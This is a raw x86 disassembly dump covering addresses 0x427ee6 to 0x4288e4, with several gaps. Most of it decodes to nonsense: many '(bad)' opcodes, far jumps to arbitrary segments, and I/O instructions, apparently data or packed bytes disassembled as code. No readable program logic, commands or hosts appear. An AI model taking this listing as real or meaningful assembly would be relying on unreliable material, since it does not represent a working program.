  427ee6:	lods   al,BYTE PTR ds:[si]
  427ee8:	add    DWORD PTR [eax],eax
  427eea:	add    BYTE PTR [ecx],al
  427eec:	add    BYTE PTR [eax],al
  427eee:	popa   
  427eef:	mov    al,ds:0x813492d3
  427ef4:	cmp    ah,BYTE PTR [esi]
  427ef6:	ins    DWORD PTR es:[edi],dx
  427ef7:	sbb    eax,0xf290fab2
  427efc:	or     BYTE PTR [ebx],dl
  427efe:	aad    0x24
  427f00:	das    
  427f01:	(bad)  
  427f02:	and    dh,dh
  427f04:	push   ds
  427f05:	jo     0x427f7c
  427f07:	sbb    eax,edi
  427f09:	int    0x1
  427f0b:	adc    al,0x56
  427f0d:	adc    al,dh
  427f0f:	cmp    dh,BYTE PTR [ebx-0x1e]
  427f12:	adc    DWORD PTR [ebx+0x11],edx
  427f15:	test   eax,0x7c783c25
  427f1a:	aam    0x9f
  427f1c:	in     eax,0x5
  427f1e:	mov    ds:0x6c4f255,eax
  427f23:	add    al,0xca
  427f25:	jb     0x427eb0
  427f27:	lock xor edi,DWORD PTR [eax]
  427f2a:	inc    eax
  427f2b:	jnp    0x427f6f
  427f2d:	mov    ch,0x17
  427f2f:	cs dec esi
  427f31:	dec    edx
  427f32:	cmp    al,BYTE PTR [ebx+ecx*8-0xae4f547]
  427f39:	mov    ebx,0x456cc746
  427f3e:	popa   
  427f3f:	(bad)  
  427f42:	mov    eax,0xe4cf92e9
  427f47:	pop    edx
  427f48:	jbe    0x427f1e
  427f4a:	(bad)  
  427f4b:	mov    eax,0x124274e4
  427f50:	dec    esp
  427f51:	push   ecx
  427f52:	jns    0x427f81
  427f54:	aad    0x53
  427f56:	test   bh,dl
  427f58:	xor    DWORD PTR [eax-0x3c],ebp
  427f5b:	mov    edx,0x8cfabfbb
  427f60:	sbb    BYTE PTR [edx+0x36766567],dl
  427f66:	hlt    
  427f67:	sar    DWORD PTR [ebx+edx*4],0xf0
  427f6b:	inc    ebp
  427f6c:	jmp    0x38ea:0xd484577c
  427f73:	xchg   ebx,eax
  427f74:	je     0x427f8b
  427f76:	rcl    DWORD PTR ds:0x467aa2,cl
  427f7c:	or     al,0xea
  427f7e:	pop    edx
  427f7f:	xchg   edx,eax
  427f80:	mov    ebp,0xf9ec5e6d
  427f85:	and    DWORD PTR [eax-0x50dd8a2f],edi
  427f8b:	js     0x427f30
  427f8d:	mov    esi,0xb6445116
  427f92:	int3   
  427f93:	mov    ss,WORD PTR [edx+0x3e]
  427f96:	pop    ds
  427f97:	adc    BYTE PTR [eax-0x477d395b],bl
  427f9d:	pop    ds
  427f9e:	das    
  427f9f:	dec    ebp
  427fa0:	push   edx
  427fa1:	je     0x427f8d
  427fa3:	test   BYTE PTR [esi+0x40],dl
  427fa6:	arpl   si,sp
  427fa8:	lock jg 0x427f5f
  427fab:	aas    
  427fac:	jle    0x42800b
  427fae:	adc    DWORD PTR [esi-0x7c],esi
  427fb1:	mov    WORD PTR [esp+ecx*2+0x5b],?
  427fb5:	push   ecx
  427fb6:	lahf   
  427fb7:	jns    0x427f68
  427fb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427fba:	and    ecx,DWORD PTR [eax]
  427fbc:	mov    ebx,0xa8216033
  427fc1:	popa   
  427fc2:	push   es
  427fc3:	sti    
  427fc4:	ja     0x428030
  427fc6:	inc    ecx
  427fc7:	arpl   WORD PTR [eax],si
  427fc9:	cmp    al,0x0
  427fcb:	aad    0x41
  427fcd:	push   0x7a7001ef
  427fd2:	cmp    al,dh
  427fd4:	imul   ecx,DWORD PTR [ebx],0xffffffaf
  427fd7:	sub    ebx,DWORD PTR [ebx]
  427fd9:	mov    bl,0x38
  427fdb:	xor    edi,DWORD PTR [esi+0x86fca74]
  427fe1:	xor    edi,ebx
  427fe3:	push   eax
  427fe4:	xchg   esi,eax
  427fe5:	(bad)  
  427fe6:	fwait
  427fe7:	jle    0x427fe5
  427fe9:	mov    ds:0xec003b15,eax
	...
  428056:	mov    cl,0xa7
  428058:	dec    ebx
  428059:	das    
  42805a:	pop    edi
  42805b:	out    dx,eax
  42805c:	cmc    
  42805d:	mov    edi,0x22b0803f
  428062:	adc    al,0xe8
  428064:	push   edi
  428065:	push   ds
  428066:	lods   eax,DWORD PTR ds:[si]
  428068:	add    DWORD PTR [eax],eax
  42806a:	add    BYTE PTR [ecx],al
  42806c:	add    BYTE PTR [eax],al
  42806e:	fbld   TBYTE PTR [edx+0x41]
  428071:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428072:	push   edi
  428073:	in     eax,0x29
  428075:	mov    es,ebx
  428077:	mov    dh,0xf6
  428079:	jns    0x428009
  42807b:	xor    al,al
  42807d:	cmp    cl,dl
  42807f:	dec    eax
  428080:	scas   eax,DWORD PTR es:[edi]
  428081:	mov    cl,al
  428083:	ds and eax,0x9204b1f
  428089:	sub    al,0x6b
  42808b:	adc    dl,dh
  42808d:	mov    ds:0x4be17bc2,eax
  428092:	cmp    cl,BYTE PTR [ebx-0x5e]
  428095:	push   es
  428096:	xor    BYTE PTR [edi+ecx*4-0x36c7ffd9],ah
  42809d:	icebp  
  42809e:	or     eax,0xcc711ecf
  4280a3:	popa   
  4280a4:	adc    ah,BYTE PTR [edi]
  4280a6:	retf   0xc19b
  4280a9:	bound  esp,QWORD PTR [ebp+0x2f89dcf9]
  4280af:	pop    edi
  4280b0:	or     bl,ah
  4280b2:	cmp    al,BYTE PTR [edx+0x443d80bf]
  4280b8:	lock mov al,0x60
  4280bb:	retf   
  4280bc:	push   esp
  4280bd:	shl    DWORD PTR [ecx],0xc4
  4280c0:	or     BYTE PTR [ebx+0x22],0xf2
  4280c4:	pop    esi
  4280c5:	push   0xffffffa7
  4280c7:	sub    al,0xb2
  4280c9:	mov    dl,0x16
  4280cb:	and    al,0xbe
  4280cd:	cmp    BYTE PTR [ecx],ch
  4280cf:	repz inc edi
  4280d1:	lahf   
  4280d2:	push   edx
  4280d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4280d4:	pop    ds
  4280d5:	pop    ecx
  4280d6:	push   eax
  4280d7:	into   
  4280d8:	sbb    ch,al
  4280da:	pop    ecx
  4280db:	mov    cl,0x2
  4280dd:	gs jne 0x4280da
  4280e0:	test   eax,0x2d04679a
  4280e5:	leave  
  4280e6:	xor    ecx,edx
  4280e8:	jnp    0x42806e
  4280ea:	sti    
  4280eb:	ror    ecx,1
  4280ed:	lahf   
  4280ee:	and    dh,BYTE PTR [edi]
  4280f0:	add    BYTE PTR [esi],ch
  4280f2:	rcr    dl,1
  4280f4:	add    edi,ebp
  4280f6:	adc    al,0xa9
  4280f8:	xor    esi,esp
  4280fa:	sub    edi,DWORD PTR [ebp+0x27]
  4280fd:	call   0x722c:0xac508915
  428104:	in     eax,0x65
  428106:	xor    BYTE PTR [edx+0x61c8bdbf],al
  42810c:	clc    
  42810d:	cmp    esi,DWORD PTR [esi]
  42810f:	pop    edx
  428110:	cmp    eax,0x99ffae0
  428115:	das    
  428116:	repz jge 0x4280dc
  428119:	cdq    
  42811a:	push   cs
  42811b:	(bad)  
  42811c:	mov    edi,0x23f8351
  428121:	xchg   edx,eax
  428122:	xor    ecx,ebx
  428124:	cmp    BYTE PTR [edi-0x64],ah
  428127:	fs xchg esi,eax
  428129:	push   ds
  42812a:	mov    bh,0xbc
  42812c:	mov    eax,ds:0x1faa4fa1
  428131:	jl     0x4280bd
  428133:	ds cmp ah,al
  428136:	sub    al,0xf3
  428138:	retf   0xb63f
  42813b:	retf   
  42813c:	sar    esi,1
  42813e:	and    DWORD PTR [ecx-0x25bf59b1],esi
  428144:	(bad)  
  428147:	loopne 0x4281c2
  428149:	sahf   
  42814a:	dec    esp
  42814b:	dec    esp
  42814c:	ret    
  42814d:	in     eax,0xfd
  42814f:	xchg   edx,eax
  428150:	inc    ecx
  428151:	inc    esp
  428152:	xor    ch,BYTE PTR [ecx-0x69]
  428155:	out    dx,al
  428156:	sbb    eax,0xfd4e3d43
  42815b:	jbe    0x42816e
  42815d:	inc    eax
  42815e:	rol    esi,cl
  428160:	pop    edi
  428161:	popa   
  428162:	mov    esp,0x31ce228b
  428167:	sbb    ebp,edi
  428169:	je     0x428186
  42816b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42816c:	cmp    DWORD PTR [edi+0x0],esi
	...
  4281d6:	fucomip st,st(6)
  4281d8:	std    
  4281d9:	dec    esp
  4281da:	std    
  4281db:	pop    edi
  4281dc:	(bad)  
  4281dd:	call   FWORD PTR [edx]
  4281df:	xchg   edi,eax
  4281e0:	pop    esp
  4281e1:	push   ecx
  4281e2:	das    
  4281e3:	xor    al,0x26
  4281e5:	retf   0xae67
  4281e8:	add    DWORD PTR [eax],eax
  4281ea:	add    BYTE PTR [ecx],al
  4281ec:	add    BYTE PTR [eax],al
  4281ee:	ja     0x4281f9
  4281f0:	jmp    0x42822a
  4281f2:	ret    
  4281f3:	ins    DWORD PTR es:[edi],dx
  4281f4:	mov    ds:0xa0d51246,eax
  4281f9:	out    dx,eax
  4281fa:	gs xchg esp,eax
  4281fc:	rcr    BYTE PTR [edx-0x2],0xd0
  428200:	ret    0x38f0
  428203:	xchg   esp,eax
  428204:	dec    edi
  428205:	mov    ecx,0xcfc97514
  42820a:	rol    BYTE PTR [esi],cl
  42820c:	gs stos BYTE PTR es:[edi],al
  42820e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42820f:	ds jbe 0x428264
  428212:	rcr    BYTE PTR [ecx+ebp*4],cl
  428215:	es (bad) 
  428217:	jae    0x4281dc
  428219:	mov    ebp,0x385c6c6e
  42821e:	push   esp
  42821f:	xchg   DWORD PTR [esi-0x3e],ebx
  428222:	lea    ecx,[edi]
  428224:	push   ss
  428225:	shr    DWORD PTR [eax],0xd7
  428228:	sar    BYTE PTR [edx-0x46],1
  42822b:	or     bh,al
  42822d:	pop    edi
  42822e:	arpl   dx,bp
  428230:	mov    edx,0x3e8d4dc2
  428235:	and    BYTE PTR [edi-0x55c4d07b],0x86
  42823c:	and    eax,DWORD PTR [edi+0x505fed8]
  428242:	jne    0x4281e6
  428244:	jne    0xcd6fd10f
  42824a:	jge    0x428292
  42824c:	xchg   DWORD PTR [edi-0x7a],edi
  42824f:	js     0x42821e
  428251:	je     0x42825a
  428253:	sahf   
  428254:	add    bl,dl
  428256:	stos   BYTE PTR es:[edi],al
  428257:	fbstp  TBYTE PTR [edx+0x6e]
  42825a:	pushf  
  42825b:	jmp    0x9e527a98
  428260:	mov    ds:0xdacc076b,al
  428265:	loop   0x4281f7
  428267:	and    ah,BYTE PTR [ebx+0x6b]
  42826a:	int    0x80
  42826c:	sti    
  42826d:	cwde   
  42826e:	les    esi,FWORD PTR [eax]
  428270:	or     al,0x72
  428272:	mov    esi,0x57f7111b
  428277:	xchg   esi,eax
  428278:	stc    
  428279:	pop    ecx
  42827a:	xor    eax,0xd6c34601
  42827f:	sub    esi,DWORD PTR [ecx+ebx*4-0x55]
  428283:	jb     0x428222
  428285:	lods   eax,DWORD PTR ds:[esi]
  428286:	sub    DWORD PTR [ecx],eax
  428288:	jl     0x428265
  42828a:	or     eax,0x4e10970f
  42828f:	fwait
  428290:	(bad)  
  428291:	dec    edx
  428292:	test   BYTE PTR [eax+0x55],bh
  428295:	repz push ss
  428297:	xor    BYTE PTR [eax-0x45],bh
  42829a:	pop    es
  42829b:	sub    eax,DWORD PTR [ebp+0x7cb1f4ec]
  4282a1:	and    eax,0x7e0f6294
  4282a6:	fnstenv [ebx+ebx*8]
  4282a9:	pop    ebx
  4282aa:	rol    DWORD PTR [edx-0x3895203b],1
  4282b0:	fs sub ch,cl
  4282b3:	into   
  4282b4:	mov    ah,0xbe
  4282b6:	pop    esi
  4282b7:	mov    esp,0xecc83fca
  4282bc:	pop    edi
  4282bd:	mov    ecx,0x38d218bf
  4282c2:	(bad)  
  4282c3:	fimul  WORD PTR [eax]
  4282c5:	or     ch,BYTE PTR [ecx]
  4282c7:	xchg   ebp,eax
  4282c8:	mov    esi,edx
  4282ca:	add    cl,0x4a
  4282cd:	pop    ss
  4282ce:	test   BYTE PTR [esi],bl
  4282d0:	test   DWORD PTR [ecx+0x5cce0871],edi
  4282d6:	mov    ah,BYTE PTR [edx+0x57]
  4282d9:	mov    ebx,0xbb10d106
  4282de:	ins    DWORD PTR es:[edi],dx
  4282df:	sbb    al,ch
  4282e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4282e2:	(bad)  
  4282e3:	test   al,0x50
  4282e5:	iretw  
  4282e7:	out    dx,al
  4282e8:	push   ebp
  4282e9:	sub    edx,DWORD PTR fs:[esi-0x44]
  4282ed:	push   eax
	...
  428356:	(bad)  
  428357:	fidiv  WORD PTR [esi]
  428359:	loop   0x42839a
  42835b:	jmp    0x5c37:0x7b70ffd7
  428362:	xor    bh,BYTE PTR [ebp-0x51]
  428365:	shl    BYTE PTR [edi-0x51],1
  428368:	add    DWORD PTR [eax],eax
  42836a:	add    BYTE PTR [ecx],al
  42836c:	add    BYTE PTR [eax],al
  42836e:	daa    
  42836f:	mov    eax,ds:0xbaec1cbd
  428374:	push   ebx
  428375:	fisub  WORD PTR ds:0x302fc0d5
  42837b:	cmp    edx,edx
  42837d:	mov    edi,0xdd0c228c
  428382:	js     0x42838f
  428384:	adc    edx,ebp
  428386:	pop    edi
  428387:	popf   
  428388:	mov    ecx,edi
  42838a:	jae    0x4283bc
  42838c:	lods   eax,DWORD PTR ds:[esi]
  42838d:	in     al,dx
  42838e:	sbb    eax,0xffffffac
  428391:	retf   
  428392:	mov    esi,DWORD PTR [eax]
  428394:	setno  BYTE PTR [ecx-0x67]
  428398:	aam    0x8f
  42839a:	fild   QWORD PTR [eax-0x77d10875]
  4283a0:	sub    DWORD PTR [edi],0x77
  4283a3:	clc    
  4283a4:	iret   
  4283a5:	mov    dl,0x30
  4283a7:	lods   eax,DWORD PTR ds:[esi]
  4283a8:	fistp  WORD PTR [edi-0x77ee17f9]
  4283ae:	mov    eax,0xb6da954e
  4283b3:	arpl   WORD PTR [eax+0x5],sp
  4283b6:	sub    bl,BYTE PTR [edx-0x49]
  4283b9:	in     al,0x74
  4283bb:	mov    ecx,0x9ed6c1e3
  4283c0:	inc    edx
  4283c1:	mov    edx,DWORD PTR [eax+0x22f1a1c6]
  4283c7:	int3   
  4283c8:	jecxz  0x428372
  4283ca:	sub    BYTE PTR [ebx+esi*4],bh
  4283cd:	test   eax,0xa6927a17
  4283d2:	(bad)  
  4283d3:	mov    esp,0xcfe865b
  4283d8:	stc    
  4283d9:	and    al,0x16
  4283db:	repnz or eax,0x9be34741
  4283e1:	sahf   
  4283e2:	enter  0xa48a,0x89
  4283e6:	stc    
  4283e7:	daa    
  4283e8:	ret    0x7343
  4283eb:	and    esi,DWORD PTR [edx+0x38]
  4283ee:	or     eax,0x2633bd3f
  4283f3:	test   al,0x3a
  4283f5:	push   edi
  4283f6:	jp     0x428436
  4283f8:	mov    bl,0x7f
  4283fa:	out    dx,al
  4283fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4283fc:	and    DWORD PTR [ebp-0x7b],esi
  4283ff:	sub    esi,DWORD PTR [edi]
  428401:	or     bh,0x67
  428404:	and    DWORD PTR [eax],0x31
  428407:	mov    ch,BYTE PTR [eax]
  428409:	fwait
  42840a:	cmp    al,0x16
  42840c:	or     ah,BYTE PTR [edx+0x4]
  42840f:	addr16 pop es
  428411:	push   es
  428412:	xor    eax,0xd89ae023
  428417:	add    DWORD PTR [ebx-0x713dcd74],esp
  42841d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42841e:	ds jl  0x42846a
  428421:	pop    edi
  428423:	test   DWORD PTR [edi+0x5e2050cd],ebx
  428429:	mov    ah,0x5a
  42842b:	cdq    
  42842c:	cwde   
  42842d:	rol    ebx,0x2
  428430:	sbb    BYTE PTR [edi-0x7f29615],0xa
  428437:	cmp    DWORD PTR [eax-0x16],edi
  42843a:	sbb    DWORD PTR [edi-0x37],ecx
  42843d:	fisttp QWORD PTR [ecx]
  42843f:	loope  0x4284c0
  428441:	call   0xc1be3ce0
  428446:	add    ebx,DWORD PTR [esi]
  428448:	(bad)  
  428449:	fldpi  
  42844b:	adc    BYTE PTR [ebp+0x43],bl
  42844e:	les    ecx,FWORD PTR [ecx+0x362308da]
  428454:	cmc    
  428455:	xor    BYTE PTR [ecx],ch
  428457:	(bad)  
  428458:	mov    al,ds:0xa573682f
  42845d:	dec    edx
  42845e:	or     eax,0xf31fbc1c
  428463:	inc    eax
  428464:	inc    esi
  428465:	lock and ecx,DWORD PTR [ebp-0x7]
  428469:	and    dl,bl
  42846b:	add    edi,DWORD PTR [ebx-0x4d]
	...
  4284d6:	push   cs
  4284d7:	xchg   esp,eax
  4284d8:	jg     0x42853d
  4284da:	(bad)  
  4284db:	jmp    0x4284fb
  4284dd:	std    
  4284de:	mov    edi,0xa8abfb32
  4284e3:	in     al,dx
  4284e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4284e5:	pop    ebx
  4284e6:	addr16 mov al,0x1
  4284e9:	add    BYTE PTR [eax],al
  4284eb:	add    DWORD PTR [eax],eax
  4284ed:	add    BYTE PTR [ebx-0xc7f694d],ah
  4284f3:	xchg   edi,eax
  4284f4:	repz iret 
  4284f6:	jno    0x4284e8
  4284f8:	std    
  4284f9:	mov    edx,0x38d1a3b9
  4284fe:	mov    ds:0x496ad399,al
  428503:	retf   0x65c5
  428506:	enter  0x303a,0x3d
  42850a:	gs jg  0x428491
  42850d:	test   BYTE PTR [esp+ebx*2+0x5ee86514],dh
  428514:	test   eax,0xfd8e483a
  428519:	inc    DWORD PTR [ebx+eax*8+0x172749c2]
  428520:	mov    WORD PTR [eax+0x6d],cs
  428523:	jb     0x4284e0
  428525:	jge    0x428555
  428527:	lods   eax,DWORD PTR ds:[esi]
  428528:	adc    DWORD PTR [ebp-0x8],ebx
  42852b:	enter  0x7cc8,0x77
  42852f:	fs retf 0xaa0b
  428533:	mov    edx,0xf8bdb3e6
  428538:	jmp    FWORD PTR [edx]
  42853a:	jb     0x4284e9
  42853c:	clc    
  42853d:	iret   
  42853e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42853f:	jbe    0x4284c4
  428541:	nop
  428542:	add    ecx,DWORD PTR [esi+0x359b60b1]
  428548:	out    dx,al
  428549:	cwde   
  42854a:	scas   al,BYTE PTR es:[edi]
  42854b:	cli    
  42854c:	mov    edi,0xedb6de9a
  428551:	xor    al,0x9b
  428553:	lahf   
  428554:	inc    edx
  428555:	pusha  
  428556:	xor    al,0x8e
  428558:	dec    esi
  428559:	pop    ebp
  42855a:	adc    BYTE PTR [eax+0x0],cl
  42855d:	mov    ecx,0xc7a61f7c
  428562:	push   cs
  428563:	xor    BYTE PTR [edx+0x58925147],0xcc
  42856a:	xchg   esi,eax
  42856b:	or     DWORD PTR [edx+0x73],edx
  42856e:	pushf  
  42856f:	dec    ebp
  428570:	hlt    
  428571:	jns    0x42854e
  428573:	mov    eax,DWORD PTR [ecx]
  428575:	(bad)  
  428576:	popa   
  428577:	xlat   BYTE PTR ds:[ebx]
  428578:	and    al,0x7a
  42857a:	inc    edi
  42857b:	jns    0x4285a8
  42857d:	xchg   ebp,eax
  42857e:	pop    ebx
  42857f:	popa   
  428580:	inc    edx
  428581:	inc    ecx
  428582:	push   edx
  428583:	arpl   WORD PTR [ebp+esi*4-0x726c06f],ax
  42858a:	fadd   st(0),st
  42858c:	aam    0x79
  42858e:	inc    ecx
  42858f:	cld    
  428590:	cwde   
  428591:	out    dx,al
  428592:	dec    esp
  428593:	or     dh,0x42
  428596:	add    BYTE PTR [eax],al
  428598:	daa    
  428599:	retf   
  42859a:	jmp    0xcb23563a
  42859f:	jg     0x4285ce
  4285a1:	pop    ds
  4285a2:	push   es
  4285a3:	mov    ecx,cs
  4285a5:	mov    esp,0xd796b970
  4285aa:	fidivr DWORD PTR [ebx+esi*4]
  4285ad:	jb     0x4285fd
  4285af:	adc    BYTE PTR es:[esi+0x49],al
  4285b3:	add    bh,BYTE PTR [edi]
  4285b5:	dec    edx
  4285b6:	sbb    BYTE PTR [bx+0x1d],bl
  4285ba:	shl    dh,0x17
  4285bd:	xchg   ebp,eax
  4285be:	je     0x4285aa
  4285c0:	test   DWORD PTR [edi+edx*8-0x2b],0x5240c376
  4285c8:	add    esi,DWORD PTR [ecx-0x45]
  4285cb:	xchg   esp,eax
  4285cc:	push   edi
  4285cd:	(bad)  
  4285cf:	mov    si,0xfb55
  4285d3:	scas   al,BYTE PTR es:[edi]
  4285d4:	repz idiv BYTE PTR es:[ecx+0x6c]
  4285d9:	test   eax,0x1f63a0cd
  4285de:	jo     0x4285fa
  4285e0:	add    edi,DWORD PTR [esi+0x37]
  4285e3:	xchg   ebp,eax
  4285e4:	nop
  4285e5:	jecxz  0x4285de
  4285e7:	ins    DWORD PTR es:[edi],dx
  4285e8:	mov    ?,WORD PTR [edi-0x2d0e4d33]
	...
  428656:	push   ecx
  428657:	div    BYTE PTR ds:0x5bffb73e
  42865d:	inc    edi
  42865f:	mov    esi,0x116ba3f6
  428664:	sub    al,0xd6
  428666:	addr16 mov cl,0x1
  428669:	add    BYTE PTR [eax],al
  42866b:	add    DWORD PTR [eax],eax
  42866d:	add    dl,bh
  42866f:	ja     0x428629
  428671:	cmp    eax,0x18d3f420
  428676:	test   BYTE PTR [edi+eiz*4-0x68],bh
  42867a:	popa   
  42867b:	mov    al,ds:0x98de541a
  428680:	test   BYTE PTR [eax+0x186e0701],bh
  428686:	in     al,dx
  428687:	cmp    BYTE PTR [ecx+0x68f7f36c],al
  42868d:	push   ebp
  42868e:	mov    bl,0xfa
  428690:	add    al,0x8e
  428692:	jbe    0x42861c
  428694:	inc    ebx
  428695:	(bad)  
  428696:	pusha  
  428697:	sti    
  428698:	cmp    ecx,ebp
  42869a:	ins    BYTE PTR es:[edi],dx
  42869b:	out    0x30,eax
  42869d:	int    0x48
  42869f:	or     DWORD PTR ds:0xc1a491a5,esp
  4286a5:	inc    edx
  4286a6:	lods   eax,DWORD PTR ds:[esi]
  4286a7:	ror    esp,0xe6
  4286aa:	xor    DWORD PTR [edx],esp
  4286ac:	pop    ecx
  4286ad:	mov    ch,BYTE PTR [eax]
  4286af:	repz mov ch,0x79
  4286b2:	inc    edx
  4286b3:	inc    ebx
  4286b4:	pop    esp
  4286b5:	and    eax,DWORD PTR [ebx-0x2b85ff38]
  4286bb:	add    DWORD PTR [ebp+0x666e59e7],esi
  4286c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4286c2:	outs   dx,BYTE PTR ds:[esi]
  4286c3:	add    dh,BYTE PTR [ebx-0x6b01ba51]
  4286c9:	pop    esi
  4286ca:	imul   ecx,DWORD PTR [ebp+0x1c052f7d],0xffffffe9
  4286d1:	cld    
  4286d2:	push   eax
  4286d3:	xchg   edi,eax
  4286d4:	ficom  WORD PTR [ecx+0x133b4603]
  4286da:	sti    
  4286db:	aas    
  4286dc:	adc    eax,esi
  4286de:	sub    dl,bh
  4286e0:	stos   DWORD PTR es:[edi],eax
  4286e1:	popa   
  4286e2:	(bad)  
  4286e3:	jg     0x42866a
  4286e5:	push   cs
  4286e6:	mov    cs,WORD PTR [edi]
  4286e8:	sub    bh,ch
  4286ea:	scas   al,BYTE PTR es:[edi]
  4286eb:	repz xor BYTE PTR [esi+edi*4+0x35],dh
  4286f0:	hlt    
  4286f1:	adc    BYTE PTR [ecx],al
  4286f3:	ret    0x9e1f
  4286f6:	repnz adc al,0xea
  4286f9:	scas   eax,DWORD PTR es:[edi]
  4286fa:	xchg   DWORD PTR [eax+0xfc42317],edi
  428700:	(bad)  
  428701:	push   edx
  428702:	push   esi
  428703:	jge    0x4286cd
  428705:	or     DWORD PTR [edx],edi
  428707:	in     al,0x45
  428709:	pop    ds
  42870a:	mov    ds:0x56e58cff,eax
  42870f:	pop    esp
  428710:	add    esi,DWORD PTR [ebx+ebp*4+0x7cf864df]
  428717:	icebp  
  428718:	cwde   
  428719:	pusha  
  42871a:	push   edx
  42871b:	fs inc edi
  42871d:	adc    edi,DWORD PTR [esi+edi*8+0x74]
  428721:	jmp    0xda4d:0x4c767763
  428728:	(bad)  
  428729:	pop    ss
  42872a:	xchg   ebx,eax
  42872b:	call   0xdbcd624a
  428730:	jnp    0x4286c1
  428732:	lds    ecx,FWORD PTR [esi+edi*2]
  428735:	or     al,0x49
  428737:	in     eax,dx
  428738:	ja     0x4286e7
  42873a:	cmp    al,0xdd
  42873c:	daa    
  42873d:	or     DWORD PTR [ebp-0x4a],esp
  428740:	outs   dx,BYTE PTR ds:[esi]
  428741:	and    bl,BYTE PTR [edx-0x36]
  428744:	lock lds eax,FWORD PTR [ebx+edi*2]
  428748:	xchg   BYTE PTR [ecx+ecx*1-0x87dd563],cl
  42874f:	inc    esp
  428750:	adc    ebx,DWORD PTR [ebp+0x71]
  428753:	nop
  428754:	(bad)  
  428755:	cli    
  428756:	adc    bx,WORD PTR [ecx+0x1929d29e]
  42875d:	lods   al,BYTE PTR ds:[esi]
  42875e:	icebp  
  42875f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428760:	push   ebx
  428761:	add    ah,cl
  428763:	push   ss
  428764:	pop    ds
  428765:	mov    ah,0x8f
  428767:	xor    eax,0x5a0c94b0
  42876c:	sub    DWORD PTR [ebx+0x0],ebp
	...
  4287d6:	push   esi
  4287d7:	pop    ebx
  4287d8:	xor    al,0x78
  4287da:	cmp    eax,0xe77f5e7f
  4287df:	inc    ebp
  4287e0:	call   0x8bd37f8
  4287e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4287e6:	addr16 mov dl,0x1
  4287e9:	add    BYTE PTR [eax],al
  4287eb:	add    DWORD PTR [eax],eax
  4287ed:	add    BYTE PTR [edx],bh
  4287ef:	hlt    
  4287f0:	jae    0x428860
  4287f2:	push   ebp
  4287f3:	mov    edx,0xbcef2597
  4287f8:	mov    ch,0xdc
  4287fa:	fild   WORD PTR [ebx]
  4287fc:	xor    ch,BYTE PTR [edi+0xe]
  4287ff:	enter  0x6b72,0xaa
  428803:	jmp    0xfbdc:0xc09ef4ad
  42880a:	frstor [esi]
  42880c:	mov    dl,0x83
  42880e:	jae    0x428837
  428810:	jmp    0x9f642f99
  428815:	les    ebx,FWORD PTR [edx-0x7c39b2ac]
  42881b:	loope  0x42885e
  42881d:	and    al,0x6f
  42881f:	fsubrp st(5),st
  428821:	sub    DWORD PTR [eax+0x44],ecx
  428824:	push   0xffffffd3
  428826:	js     0x428889
  428828:	jne    0x428878
  42882a:	add    eax,0xaaf8f5d8
  42882f:	scas   eax,DWORD PTR es:[edi]
  428830:	or     dl,ah
  428832:	add    DWORD PTR [esi],ebp
  428834:	retf   
  428835:	sub    edi,DWORD PTR [ebx+0x31]
  428838:	push   ebp
  428839:	push   edx
  42883a:	int3   
  42883b:	xchg   ebx,eax
  42883c:	bound  ecx,QWORD PTR [eax+edi*4]
  42883f:	pop    edi
  428840:	and    BYTE PTR [ebp-0x7b],dl
  428843:	and    edi,edi
  428845:	or     BYTE PTR [ecx],bl
  428847:	pushf  
  428848:	or     ch,BYTE PTR [edi]
  42884a:	in     eax,dx
  42884b:	cld    
  42884c:	jp     0x4287eb
  42884e:	xchg   ebp,eax
  42884f:	repnz aas 
  428851:	inc    edi
  428852:	in     al,dx
  428853:	outs   dx,DWORD PTR ds:[esi]
  428854:	in     eax,0x47
  428856:	adc    BYTE PTR [edi*4-0x71bf2bbe],0x6d
  42885e:	pop    esi
  42885f:	jbe    0x4288b9
  428861:	adc    BYTE PTR [edx+0x69],al
  428864:	popa   
  428865:	(bad)  
  428867:	jnp    0x4288ab
  428869:	sar    BYTE PTR [ecx-0x5b],0x5f
  42886d:	out    dx,eax
  42886e:	dec    ebx
  42886f:	xor    ah,bh
  428871:	adc    ah,bl
  428873:	sub    ecx,DWORD PTR [edi-0x55]
  428876:	sub    DWORD PTR [esp+edx*1-0x6d04149a],0x50
  42887e:	in     eax,dx
  42887f:	add    eax,0xf0064e1f
  428884:	mov    bl,0x18
  428886:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428887:	iret   
  428888:	xchg   edx,eax
  428889:	cwde   
  42888a:	sub    ebx,ebp
  42888c:	neg    DWORD PTR [ebx+ebp*8]
  42888f:	dec    ebp
  428890:	out    0xb2,eax
  428892:	inc    edx
  428893:	dec    esp
  428894:	cs dec edi
  428896:	xchg   ebx,eax
  428897:	dec    edx
  428898:	xchg   dh,bh
  42889a:	nop
  42889b:	jmp    0x42886e
  42889d:	es and eax,0x361cc9df
  4288a3:	xor    al,0xfb
  4288a5:	push   edi
  4288a6:	cs int3 
  4288a8:	sti    
  4288a9:	mov    al,ds:0xfbe71cec
  4288ae:	xchg   BYTE PTR [ecx+0x661da544],cl
  4288b4:	retf   0xef32
  4288b7:	rcl    BYTE PTR [ecx+0x6a],1
  4288ba:	or     BYTE PTR [eax+0x492dd9d],bl
  4288c0:	mov    esp,DWORD PTR [edi-0x20f3d414]
  4288c6:	fisttp QWORD PTR [ebp+ecx*2-0x157d5b04]
  4288cd:	in     al,0x26
  4288cf:	stos   BYTE PTR es:[edi],al
  4288d0:	mov    BYTE PTR [edi+esi*2+0x78],bh
  4288d4:	sar    BYTE PTR [ebx],cl
  4288d6:	rol    BYTE PTR [edi],0x70
  4288d9:	sbb    DWORD PTR [esi-0x2a],ebx
  4288dc:	pop    esi
  4288dd:	inc    ebx
  4288de:	je     0x42893f
  4288e0:	xchg   esp,eax
  4288e1:	xchg   ecx,eax
  4288e2:	sbb    al,0x5e
  4288e4:	je     0x428925
